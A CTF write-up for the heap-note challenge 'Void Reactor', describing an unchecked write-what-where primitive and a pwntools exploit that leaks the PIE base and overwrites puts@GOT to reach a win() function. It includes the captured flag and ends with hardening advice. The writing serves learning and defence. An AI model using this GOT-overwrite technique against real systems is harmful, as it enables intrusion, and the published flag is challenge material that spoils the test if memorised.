---
title: "Void Reactor"
date: 2026-09-20T15:20:00+05:30
description: "Arbitrary write-what-where in a heap-note simulator, chained into a Partial RELRO GOT overwrite to hijack control flow."
category: "Binary Exploitation"
ctf: "Lunar CTF Quals"
difficulty: "Hard"
points: 250
flag: "Lun4R{v01d_r34ct0r_cr1t1c4l_m3ltd0wn_ach13v3d}"
author: "Reshma Al (Coldcoffee)"
tools: "pwntools, GDB-GEF, objdump, checksec, readelf"
tags:
  - "Binary Exploitation"
  - "Lunar CTF Quals"
  - "Coldcoffee Solves"
---

<div class="flag-callout">
  <span class="flag-label"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"></path><line x1="4" y1="22" x2="4" y2="15"></line></svg> Captured Flag</span>
  <code>Lun4R{v01d_r34ct0r_cr1t1c4l_m3ltd0wn_ach13v3d}</code>
  <button class="flag-copy-btn" onclick="navigator.clipboard.writeText('Lun4R{v01d_r34ct0r_cr1t1c4l_m3ltd0wn_ach13v3d}');this.innerText='Copied!';setTimeout(()=>this.innerText='Copy',2000)">Copy</button>
</div>

## 1. Initial Triage
We're given a single stripped 64-bit ELF, `void_reactor`, themed as a reactor control console:

```
$ checksec --file=void_reactor
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

Partial RELRO means `.got.plt` stays writable at runtime, so any arbitrary write we find can skip stack-smashing entirely and go straight for a GOT entry. The binary exposes a themed CLI:

```
1) INSERT     Load a fuel rod
2) CALIBRATE  Recalibrate rod payload
3) INSPECT    View rod telemetry
4) EXTRACT    Remove a rod
5) ACTIVATE   Fire a gamma rod
6) STATUS     Reactor diagnostics
7) SCRAM      Emergency shutdown
```

It's a heap-note-style menu challenge, with "rods" standing in for heap chunks.

---

## 2. Locating the Win Function
`strings -n 8 void_reactor` surfaces the payoff strings immediately:

```
[!] Meltdown aborted: core override token invalid.
[!] CRITICAL CORE MELTDOWN ACHIEVED - SYSTEM DUMP
[+] EMERGENCY TELEMETRY FLAG:
```

Disassembling around those strings in `objdump -d -M intel` reveals a standalone `win()` function that is never reached from the normal menu dispatch:

```asm
mov    rdx, QWORD PTR [rip+0x4c7a]   ; rdx = AUTH_TOKEN (global)
movabs rax, 0xcafebabe1337beef
cmp    rdx, rax
je     <print_flag_and_exit>
```

Two requirements fall out of this: `AUTH_TOKEN` has to equal `0xcafebabe1337beef`, and something has to actually jump into `win()`, since it's dead code from the program's own point of view.

---

## 3. Reversing the Allocator and the Bug
The menu sits on top of a hand-rolled slab allocator over a static `.bss` arena — 8 tracked slots, each a fixed `0x50`-byte chunk with a 16-byte header (class, armed flag, salt, checksum, freelist pointer) followed by a 64-byte data region.

`INSERT` supports three rod classes; gamma rods leave two 8-byte fields inside their data region — `target` at offset `0x28` and `len` at offset `0x30` — for the user to fill in via `CALIBRATE`, which does a raw, fully attacker-controlled `read()` into the chunk.

`ACTIVATE` on a gamma rod does this, with zero validation:

```asm
mov    rdx, [rod + 0x28]   ; target
mov    rax, [rod + 0x30]   ; len
mov    [rdx], rax          ; *target = len   <-- the bug
```

That's not a corruption bug to chase — it's a deliberate, unconstrained write-what-where primitive dressed up as "configure a target and fire."

I confirmed the exact field offsets empirically rather than guessing from static analysis: `STATUS` leaks a raw `.bss` pointer (`Arena base`), which doubles as a free PIE/ASLR bypass, and writing a byte-counter pattern through `CALIBRATE` and reading it back with `INSPECT` pinned `target` at data offset `0x28` and `len` at `0x30`.

---

## 4. Building the Exploit
With `target`/`len` fully controlled, the plan is a two-shot arbitrary write:

**Write #1 — satisfy the token check.** Point `target` at `AUTH_TOKEN` and `len` at `0xcafebabe1337beef`, so `ACTIVATE` performs `*AUTH_TOKEN = 0xcafebabe1337beef`.

**Write #2 — hijack control flow.** Because RELRO is only partial, `.got.plt` is writable. Point `target` at `puts@GOT` (from `readelf -r`) and `len` at the address of `win()` (from the static disassembly). `ACTIVATE` performs `puts@GOT = &win`.

The very next `puts()` call — triggered immediately by the console's own "Core injection complete." message — jumps through the poisoned GOT entry straight into `win()`, which re-reads `AUTH_TOKEN`, finds it valid, and prints the flag.

```python
from pwn import *
import struct

p = process('./void_reactor')
p.recvuntil(b'REACTOR> ')

# leak PIE base via STATUS's raw pointer printout
menu(p, 6)
r = p.recvuntil(b'REACTOR> ').decode()
arena      = int(r.split('Arena base  : ')[1].split('\n')[0], 16)
load_base  = arena - 0x7000
token_addr = load_base + 0x6000
puts_got   = load_base + 0x4008
win_func   = load_base + 0x136b

# rod 0: *AUTH_TOKEN = 0xcafebabe1337beef
insert(p, 3, b'A')
calibrate(p, 0, b'A'*0x28 + struct.pack('<Q', token_addr)
                          + struct.pack('<Q', 0xcafebabe1337beef))
activate_slot(p, 0)

# rod 1: *puts@GOT = win_func
insert(p, 3, b'B')
calibrate(p, 1, b'B'*0x28 + struct.pack('<Q', puts_got)
                          + struct.pack('<Q', win_func))
activate_slot(p, 1)   # the success message's puts() call detonates here

print(p.recvall(timeout=5).decode(errors='replace'))
```

```
======================================================
 [!] CRITICAL CORE MELTDOWN ACHIEVED - SYSTEM DUMP
======================================================
 [+] EMERGENCY TELEMETRY FLAG: Lun4R{v01d_r34ct0r_cr1t1c4l_m3ltd0wn_ach13v3d}
======================================================
```

---

## 5. Root Cause & Takeaways
Everything else in the binary — the checksum-protected chunk headers and a genuine one-byte overflow in `CALIBRATE` — is flavor or a decoy; corrupting a neighboring chunk's checksum just trips the allocator's own integrity check on the next `INSERT`. The real, intended bug is that `ACTIVATE` lets the user pick both the write address and the write value with no bounds check at all — an arbitrary write hiding behind "fire the rod at a target."

- Full RELRO (`-Wl,-z,relro,-z,now`) would have closed the GOT-overwrite route entirely.
- Any feature shaped like "write this value to this address" is architecturally a write-what-where primitive, however it's themed, and needs its target validated.
- Printing raw pointers in a "diagnostics" menu is a free ASLR bypass — don't echo addresses back to the client.
